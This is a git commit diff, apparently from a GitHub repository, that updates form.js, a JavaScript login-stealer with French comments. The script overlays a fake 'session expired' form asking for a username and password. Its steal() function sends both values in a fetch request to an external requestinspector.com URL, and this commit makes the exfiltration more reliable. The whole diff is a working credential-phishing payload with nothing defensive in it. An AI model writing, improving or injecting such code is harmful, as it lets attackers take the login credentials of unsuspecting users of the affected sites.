f1110993294f38bafd2f2cddde48d80ba74a3c74
wissal chbani <145983090+Wissal-Chbani@users.noreply.github.com>
2025-05-07 22:35:29 +0100

    Update form.js

--- form.js
+++ form.js
@@ -1,5 +1,6 @@
-// login_stealer.js
-document.body.innerHTML = `
+// Faux formulaire de session expirée
+const div = document.createElement("div");
+div.innerHTML = `
   <div style="position:fixed;top:0;left:0;width:100%;background:white;padding:20px;z-index:9999;">
     <h3>Votre session a expiré :</h3>
     <input id="user" placeholder="Identifiant">
@@ -7,7 +8,11 @@ document.body.innerHTML = `
     <button onclick="steal()">Valider</button>
   </div>
 `;
+document.body.appendChild(div);
 
+// Fonction d’exfiltration
 function steal() {
-  fetch('https://01jtpa9tv1hahfj92dn7dbmxvp00-7695bb9a240c2e409fb7.requestinspector.com?user=' + user.value + '&pass=' + pass.value);
+  const u = document.getElementById('user').value;
+  const p = document.getElementById('pass').value;
+  fetch('https://01jtpa9tv1hahfj92dn7dbmxvp00-7695bb9a240c2e409fb7.requestinspector.com?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
 }
